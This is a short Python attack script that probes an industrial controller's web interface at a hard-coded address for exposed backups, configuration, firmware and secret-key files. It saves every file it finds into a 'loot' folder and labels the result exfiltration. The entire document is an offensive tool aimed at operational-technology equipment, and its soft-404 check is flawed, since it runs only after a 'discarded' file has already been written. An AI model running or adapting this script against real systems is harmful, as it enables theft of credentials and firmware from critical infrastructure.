import requests 
import os 

# Target Configuration
TARGET_IP = "10.0.2.15"
PORT= "80"
LOOT_DIR = "industrial_loot"

# Initialize exfiltration directory
if not os.path.exists(LOOT_DIR):
	os.makedirs(LOOT_DIR)

# Common sensitive files found in exposed PLC web interfaces
payload_wordlist = ["backup.sql", "config.bin", "firmware.zip", "secret_key"]

print(f"Initiating Automated Industrial Fuzzing against {TARGET_IP}:{PORT}. . .")

# Execute sequential GET requests
for endpoint in payload_wordlist:
	url = f"http://{TARGET_IP}:{PORT}/{endpoint}"
	
	try:	
		# 5-second timeout to prevent hanging on unresponsive OT devices
		response = requests.get(url, timeout=5)

		# HTTP 200 OK indicates the file exists and is accesible
		if response.status_code == 200:
			print(f"[+] VULNERABILITY FOUND: Exposed endpoint at {url}")
			
			file_path = f"{LOOT_DIR}/{endpoint}"
	
			# Write raw bytes to local storage (Exfiltration)
			with open(file_path, 'wb') as file:
				file.write(response.content)

			# Heuristic check to filter out soft 404s (Custom HTML error pages disguised as 200 OK)
			if b"<!DOCTYPE HTML" in response.content:
				print(f"[-] Warning: {endpoint} appears to be a soft 404 HTML response. Discarding.")
			else:
				print(f"[SUCCESS] Artifact exfiltrated: {file_path}")
				
		# HTTP 404 Not Found
		elif response.status_code == 404:
		
			pass

	except requests.exceptions.ConnectionError:
		print("[!] CRITICAL: Target connection refused. Ensure the host is alive.")
		break
	except requests.exceptions.Timeout:
		print(f"[-] TIMEOUT: Host {TARGET_IP} is unresponsive. Skipping {endpoint}... ")

print("[*] Scan iteration completed.")
